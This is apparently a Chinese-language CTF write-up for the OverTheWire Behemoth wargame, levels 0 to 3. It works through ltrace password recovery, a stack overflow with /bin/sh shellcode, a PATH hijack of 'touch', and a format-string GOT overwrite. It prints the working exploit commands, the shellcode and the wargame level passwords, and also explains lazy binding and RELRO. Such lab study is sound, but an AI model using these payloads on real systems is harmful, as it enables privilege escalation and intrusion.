---

title: CTF Waregames-Behemoth-Writeup
lang: zh
layout: article
show_subscribe: false
# full_width: true
tags: [wargame-ctf,Behemoth]

---

Behemoth wargame 是一些外界常见漏洞，包括缓冲区溢出,条件竞争和权限提升。

## behemoth0 猜密码

这道题网络不好的话，可以先把漏洞程序给dump下来,自用dump脚本。

```bash
#!/usr/bin/env bash

###### preconfig here ##################

hostname="behemoth.labs.overthewire.org"
total_usr="behemoth"
port=2221

#########################################

file="/$total_usr/$total_usr"

# argument passed
usrid=$1
pass=$2

echo "sshpass -p "$pass" scp -P $port $total_usr$usr$usrid@$hostname:$file$usrid  ."

sshpass -p "$pass" scp -P $port $total_usr$usr$usrid@$hostname:$file$usrid  .

checksec $total_usr$usrid
```

**SSH:** ssh behemoth0@narnia.labs.overthewire.org -p 2221

**pass**: behemoth0

```bash
behemoth0@behemoth:~$  cd /behemoth/
behemoth0@behemoth:/behemoth$ ./behemoth0 
Password: demoo
Access denied..
```

用ltrace指令试下：

```bash
$ ltrace ./behemoth0 
__libc_start_main(0x80485b1, 1, 0xffc717b4, 0x8048680 <unfinished ...>
printf("Password: ")                                         = 10
__isoc99_scanf(0x804874c, 0xffc716bb, 142, 0xf7f5e224Password: asd
)       = 1
strlen("OK^GSYBEX^Y")                                        = 11
strcmp("asd", "eatmyshorts")                                 = -1
puts("Access denied.."Access denied..
)                                      = 16
+++ exited (status 0) +++
```

根据man手册页`man ltrace`:

> ltrace 指令可以截取并记录程序所调用的动态库与收到的信号。还可以截取并打印系统调用。



从输出可以看到strcmp函数的比较。输入这个试一下：

```bash
behemoth0@behemoth:/behemoth$ ./behemoth0
Password: eatmyshorts
Access granted..
$ whoami
behemoth1
$ cat /etc/behemoth_pass/behemoth1
aesebootiv

```

成功。

## Behemoth 01 栈溢出

**SSH**:  ssh behemoth1@narnia.labs.overthewire.org -p 2221

**pass**: aesebootiv

```bash
behemoth1@behemoth:/behemoth$ ./behemoth1
Password: demo
Authentication failure.
Sorry.
```

ltrace试一下：
```bash
$ ltrace ./behemoth1 
__libc_start_main(0x804844b, 1, 0xffa9a0f4, 0x8048480 <unfinished ...>
printf("Password: ")                                             = 10
gets(0xffa9a015, 0xf7f782f0, 0, 0xf7d85362Password: demo
)                      = 0xffa9a015
puts("Authentication failure.\nSorry."Authentication failure.
Sorry.
)                          = 31
+++ exited (status 0) +++
```

这次不行。但是查看反汇编可以看到执行逻辑为：

```main
objdump behemoth1 -d
```

```
0804844b <main>:
 804844b:	55                   	push   %ebp
 804844c:	89 e5                	mov    %esp,%ebp
 804844e:	83 ec 44             	sub    $0x44,%esp   # 栈上分配空间为0x44
 8048451:	68 00 85 04 08       	push   $0x8048500
 8048456:	e8 a5 fe ff ff       	call   8048300 <printf@plt>
 804845b:	83 c4 04             	add    $0x4,%esp
 804845e:	8d 45 bd             	lea    -0x43(%ebp),%eax # ebp-0x43 是字符串的输入的位置
 8048461:	50                   	push   %eax
 8048462:	e8 a9 fe ff ff       	call   8048310 <gets@plt>
 8048467:	83 c4 04             	add    $0x4,%esp
 804846a:	68 0c 85 04 08       	push   $0x804850c
 804846f:	e8 ac fe ff ff       	call   8048320 <puts@plt>
 8048474:	83 c4 04             	add    $0x4,%esp
 8048477:	b8 00 00 00 00       	mov    $0x0,%eax
 804847c:	c9                   	leave  
 804847d:	c3                   	ret    
 804847e:	66 90                	xchg   %ax,%ax
```

可以看到程序没有比较字符串的操作，就调了三个函数(`printf`,`gets`,`put`),但可以利用shellcode得到shell。

反汇编代码的分析见上面注释。

所以可以用67(0x44)+4=71来覆盖ebp,67(0x44)+4+4=75来覆盖返回地址。

执行到
```
(gdb) break main 
(gdb) run < <(python3 -c 'print(71 * "A" + "BBBB")')
```
执行到gets函数返回后：
```
   ┌──────────────────────────────────────────────────────────────────────────────────────────────────────────────────┐
   │0x804844b <main>        push   %ebp                                                                               │
   │0x804844c <main+1>      mov    %esp,%ebp                                                                          │
   │0x804844e <main+3>      sub    $0x44,%esp                                                                         │
B+ │0x8048451 <main+6>      push   $0x8048500                                                                         │
>  │0x8048456 <main+11>     call   0x8048300 <printf@plt>                                                             │
   │0x804845b <main+16>     add    $0x4,%esp                                                                          │
   │0x804845e <main+19>     lea    -0x43(%ebp),%eax                                                                   │
   │0x8048461 <main+22>     push   %eax                                                                               │
   │0x8048462 <main+23>     call   0x8048310 <gets@plt>                                                               │
  >│0x8048467 <main+28>     add    $0x4,%esp                                                                          │
   │0x804846a <main+31>     push   $0x804850c                                                                         │
   │0x804846f <main+36>     call   0x8048320 <puts@plt>                                                               │
   │0x8048474 <main+41>     add    $0x4,%esp                                                                          │
   │0x8048477 <main+44>     mov    $0x0,%eax                                                                          │
   │0x804847c <main+49>     leave                                                                                     │
   │0x804847d <main+50>     ret                                                                                       │
   │0x804847e               xchg   %ax,%ax                                                                            │
   └──────────────────────────────────────────────────────────────────────────────────────────────────────────────────┘
native process 16351 In: main                                                                      L??   PC: 0x8048467 
0x08048467 in main ()
(gdb) x/16wx $ebp
0xffffd5a8:     0x41414141      0x42424242      0x00000000      0xffffd644
0xffffd5b8:     0xffffd64c      0x00000000      0x00000000      0x00000000
0xffffd5c8:     0xf7fc5000      0xf7ffdc0c      0xf7ffd000      0x00000000
0xffffd5d8:     0x00000001      0xf7fc5000      0x00000000      0x9ee76be0
(gdb) x/8wx $ebp
0xffffd5a8:     0x41414141      0x42424242      0x00000000      0xffffd644
0xffffd5b8:     0xffffd64c      0x00000000      0x00000000      0x00000000
(gdb) 

```
ebp+4也就是main函数返回地址的位置已经被覆盖了。

这里还是用环境变量来写shellcode，因为不确定gdb中的栈地址和程序运行时的栈地址是不是一样的。秘制[shellcode](https://gist.github.com/Zhang1933/0d1c7b69af48483832eb2d6b22de287e)献上。

```bash
export SHELLCODE=$(python -c 'print 20 * "\x90" + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x31\xd2\xb0\x0f\x2c\x04\xcd\x80"')
```

加了点雪橇,然后写一个程序找到环境变量地址,在文件`find_add.c`中：

```cpp
#include <stdio.h>
#include <stdlib.h>

int main(int argc, char* argv[])
{
  printf("%s is at %p\n", argv[1], getenv(argv[1]));
}
```

```bash
behemoth1@behemoth:~$ cd /tmp
behemoth1@behemoth:/tmp$ mktemp -d 
/tmp/tmp.4Dzgraq6pX
behemoth1@behemoth:/tmp$ cd tmp.4Dzgraq6pX
behemoth1@behemoth:/tmp/tmp.4Dzgraq6pX$ gcc -m32 find_add.c -o find_add
behemoth1@behemoth:/tmp/tmp.4Dzgraq6pX$ ./find_add SHELLCODE
SHELLCODE is at 0xffffde26
behemoth1@behemoth:/tmp/tmp.4Dzgraq6pX$ cd /behemoth
behemoth1@behemoth:/behemoth$ (python -c 'print 71 * "\x90" + "\x26\xde\xff\xff"';cat) | ./behemoth1
Password: Authentication failure.
Sorry.

ls -la
total 80
drwxr-xr-x  2 root      root      4096 Aug 26  2019 .
drwxr-xr-x 27 root      root      4096 Aug 26  2019 ..
-r-sr-x---  1 behemoth1 behemoth0 5900 Aug 26  2019 behemoth0
-r-sr-x---  1 behemoth2 behemoth1 5036 Aug 26  2019 behemoth1
-r-sr-x---  1 behemoth3 behemoth2 7536 Aug 26  2019 behemoth2
-r-sr-x---  1 behemoth4 behemoth3 5180 Aug 26  2019 behemoth3
-r-sr-x---  1 behemoth5 behemoth4 7488 Aug 26  2019 behemoth4
-r-sr-x---  1 behemoth6 behemoth5 7828 Aug 26  2019 behemoth5
-r-sr-x---  1 behemoth7 behemoth6 7564 Aug 26  2019 behemoth6
-r-xr-x---  1 behemoth7 behemoth6 7528 Aug 26  2019 behemoth6_reader
-r-sr-x---  1 behemoth8 behemoth7 5676 Aug 26  2019 behemoth7
whoami
behemoth2
cat /etc/behemoth_pass/behemoth2
eimahquuof
```

最好还是python2来写，之前用python3写发现输入的数据不对。

下面跟我一起用热门反汇编工具IDA来解题,顺便熟悉IDA的使用。

## Behemoth 02 流程分析

**SSH:** ssh behemoth2@narnia.labs.overthewire.org -p 2221

**Pasa:** eimahquuof

先dump下来，分析一下


```bash
$ ./crawl.sh 2 eimahquuof
sshpass -p eimahquuof scp -P 2221 behemoth2@behemoth.labs.overthewire.org:/behemoth/behemoth2  .
This is a OverTheWire game server. More information on http://www.overthewire.org/wargames

[*] '/home/z1933/workplace/vbshare/ctf/behemoth2'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)

$ file behemoth2 
behemoth2: setuid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=87daf01f3941b5f8f815d758ed9e90589a9d315c, not stripped
```

拿到IDA(这里所用的版本为7.5)中反汇编看一下。F5反汇编代码,用鼠标右键上下文菜单加了点注释，改了下变量名。

```cpp
int __cdecl main(int argc, const char **argv, const char **envp)
{
  __uid_t v3; // ebx
  __uid_t v4; // eax
  __uid_t v5; // ebx
  __uid_t v6; // eax
  stat stat_buf; // [esp+0h] [ebp-88h] BYREF
  char buffer[6]; // [esp+64h] [ebp-24h] BYREF buffer[20]
  __int16 v10; // [esp+6Ah] [ebp-1Eh] BYREF
  char *name; // [esp+78h] [ebp-10h]
  __pid_t pid; // [esp+7Ch] [ebp-Ch]
  int *v13; // [esp+80h] [ebp-8h]

  v13 = &argc;
  pid = getpid();
  name = (char *)&v10;                          // name=buffer+6
  sprintf(buffer, "touch %d", pid);
  if ( (lstat(name, &stat_buf) & 0xF000) != 0x8000 )
  {
    unlink(name);
    v3 = geteuid();
    v4 = geteuid();
    setreuid(v4, v3);
    system(buffer);
  }
  sleep(2000u);
  qmemcpy(buffer, "cat  ", 5);
  v5 = geteuid();
  v6 = geteuid();
  setreuid(v6, v5);
  system(buffer);
  return 0;
}
```

每个函数查一下linux手册看一下功能。可以推断出程序大概逻辑是：

1. buffer里面写入`touch $pid`
2. name的值就是pid，lstat因为没有这个文件会返回FFFF，条件判断会一直判断为真。
3. 执行system(touch $pid).

    关于setreuid函数的参数,Real User ID, Effective UserId,Saved User ID 可以参考[Difference between Real User ID, Effective User ID and Saved User ID](https://stackoverflow.com/questions/32455684/difference-between-real-user-id-effective-user-id-and-saved-user-id)

所以我们可以创建一个touch文件,写入:
```
/bin/sh
```

```bash
behemoth2@behemoth:~$ cd /tmp/
# 不要有其他字符,之前包括"."号失败了。
behemoth2@behemoth:/tmp$ cd /tmp/ZYV0tpD7uD
# 创建假的touch 
behemoth2@behemoth:/tmp/ZYV0tpD7uD$ echo "/bin/sh" > touch
behemoth2@behemoth:/tmp/ZYV0tpD7uD$ chmod +x touch
behemoth2@behemoth:/tmp/ZYV0tpD7uD$ export PATH=/tmp/ZYV0tpD7uD:$PATH
behemoth2@behemoth:/tmp/ZYV0tpD7uD$ /behemoth/behemoth2
$ whoami	
behemoth3
$ cat /etc/behemoth_pass/behemoth3
nieteidiel
```

## Behemoth 03 格式化字符串

**SSH :** ssh behemoth3@narnia.labs.overthewire.org -p 2221

**Pass :** nieteidiel

比较好的题，帮我复习了动态链接和格式化字符串漏洞。

鉴于网络原因,还是用前面的脚本dump下来,扔到IDA中反汇编分析。

```bash
$ ./crawl.sh 3 nieteidiel
sshpass -p nieteidiel scp -P 2221 behemoth3@behemoth.labs.overthewire.org:/behemoth/behemoth3  .
This is a OverTheWire game server. More information on http://www.overthewire.org/wargames

[*] '/home/z1933/workplace/vbshare/ctf/behemoth3'
    Arch:     i386-32-little
    RELRO:    No RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x8048000)
    RWX:      Has RWX segments

```

IDA反编译结果：
```cpp
int __cdecl main(int argc, const char **argv, const char **envp)
{
  char buffer[200]; // [esp+0h] [ebp-C8h] BYREF

  printf("Identify yourself: ");
  fgets(buffer, 200, stdin);
  printf("Welcome, ");
  printf(buffer);
  puts("\naaaand goodbye again.");
  return 0;
}
```

看到`printf(buffer)`,经典的格式化字符串漏洞:

```bash
└─$ ./behemoth3 
Identify yourself: %p,%p
Welcome, 0x252c7025,0xa70

aaaand goodbye again.
```

---

关于详细动态链接，(延迟绑定) lazy binding 可以参考[GOT and PLT for pwning.](https://systemoverlord.com/2017/03/19/got-and-plt-for-pwning.html),以及书《CSAPP》中7.12节 `Position-Independent Code(PIC)`。

这里简单说下延迟绑定流程,以在位置`.text:08048489`处调用`printf`函数为例,如何解析,可以用IDA动态调试来验证:

&ensp;&ensp; **初始化过程:**

&ensp;&ensp;&ensp;&ensp; 1. 加载器将的GOT表下标3开始的项初始化为其对应PLT条目的第二条指令。这里我用GOT表项下多个写断点来验证的,发现断点触发时，多个项都已经更新了。

&ensp;&ensp;&ensp;&ensp; 2. 记载器加载和运行动态连接器。动态链接器初始化GOT[1],GOT[2]。GOT[2]是动态连接器在ld-linux.so的入口点,GOT[1],GOT[0]是动态链接器需要用的的其他信息。
&ensp;&ensp;

&ensp;&ensp; **lazy binding过程：**

&ensp;&ensp;&ensp;&ensp;1. 调用`printf`跳转到其对应的PLT条目第一条指令。

&ensp;&ensp;&ensp;&ensp;2. 通过`printf`对应的GOT表项间接跳转跳转到PLT条目的下一条指令(因为其GOT表项被初始化为PLT条目下一条指令)。

&ensp;&ensp;&ensp;&ensp;3. 将函数ID入栈。跳转到PLT[0]第一条指令。

&ensp;&ensp;&ensp;&ensp;4. PLT[0]通过GOT[1]间接地把动态链接器第一个参数入栈，然后通过GOT[2]间接跳转到动态连接器中。动态链接器确定`printf`的运行时位置后用这个地址重写printf对应的GOT条目。再把控制传递给`printf`。

&ensp;&ensp;**下一次调用`printf`过程**
和上面步骤一样，不同的是`printf`对应的GOT表项有`printf`函数的地址了，步骤2就可以直接跳转到`printf`函数地址了。

---

上述就是延迟绑定的过程,现在让我们回到这道题中来。

关于格式化字符串漏洞可以参考这篇[文章](https://axcheron.github.io/exploit-101-format-strings/#random-write)。这里简单说下利用原理。

---

可以看出`.got.plt`节是一个可写的存有函数指针的数组,并且加载到内存中的地址还可以预测,我们利用字符串格式漏洞 **任意地址写** 来完成。

关于格式化字符，需要知道：

* 可以用`%<num>$n`来指定写入位置,`%n`接受的是一个地址参数，将会在那个地址里面写入。`%<num>$s`可以指定读位置,同样接受的是地址参数。比如`printf("%2$x", 1, 2, 3)`将会打印2。
* `AAAA%96x%7$n`将会在第七个(从0开始,第0个参数是format字符串指针)参数地址所对应的内存上写100。
* 想写入的数可能很大,比如写地址的时候,要经过很久才能输出得完,但我们可以拆分成2字节来写(%hn)。

---

知道原理了，就可以回到这道题中来了。

* 在进入位于地址`080484BF`的`printf`函数之前，栈上format指针参数与实际内容相差1个地址。
* 我们需要写的地址是`0x080497AC`,也就是GOT表中,puts函数的地址,这里用一个还没有解析的函数地址来写。
* 在GOT表中，我们需要写入环境变量中SHELLCODE的地址。

```bash
behemoth3@behemoth:~$ cd /tmp/tmp.Yi69vHyF7y
behemoth3@behemoth:/tmp/tmp.Yi69vHyF7y$ export SHELLCODE=$(python -c 'print 20 * "\x90" + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x31\xd2\xb0\x0f\x2c\x04\xcd\x80"')
behemoth3@behemoth:/tmp/tmp.Yi69vHyF7y$ ./find_add SHELLCODE
SHELLCODE is at 0xffffde25
```

有个问题，拿到SHELLCODE地址为`0xffffde25`，因为写的数量只能是递增的,所以我们需要从低位先写。

所以我们构造的字符串看起来像这样：`\xac\x97\x04\x08\xae\x97\x04\x08<val1>x%1$hn%<val2>%2$hn`

这里shellcode的地址为:

* `\xac\x97\x04\x08`,或者`0x080497ac`指向要写入数据的低2字节地址。
* `\xae\x97\x04\x08`,或者`0x080497ae`指向要写入的高2字节地址。
* val1写`0xde25-0x8`=0xDE1D=56861
* val2写`0xffff-0xde25`=0x21DA=8666

所以最后：

```bash
behemoth3@behemoth:/behemoth$ (python -c 'print "\xac\x97\x04\x08\xae\x97\x04\x08%56861x%1$hn%8666x%2$hn"';cat) | ./behemoth3
# 经过一段输出之后....
whoami
behemoth4
cat /etc/behemoth_pass/behemoth4
ietheishei
```

---


用RELRO机制防止GOT表被写可以参考[Hardening ELF binaries using Relocation Read-Only (RELRO)](https://www.redhat.com/en/blog/hardening-elf-binaries-using-relocation-read-only-relro)。

这里简单的说下不同，Partial RELRO把GOT节移到数据节(.data 和 .bss)上面去了,可以防止数据节的数据溢出到GOT中,但运行时GOT仍然可以写,不能防止格式化字符串漏洞。

FULL RELRO 除了干Partial RELRO要干的事情的以外，会在程序一开始就把GOT表填好,不采用延迟绑定机制。填好表后将GOT节设置为只读,可以防止格式化字符串漏洞。因为效率问题，Partial RELRO为编译默认选择。

---


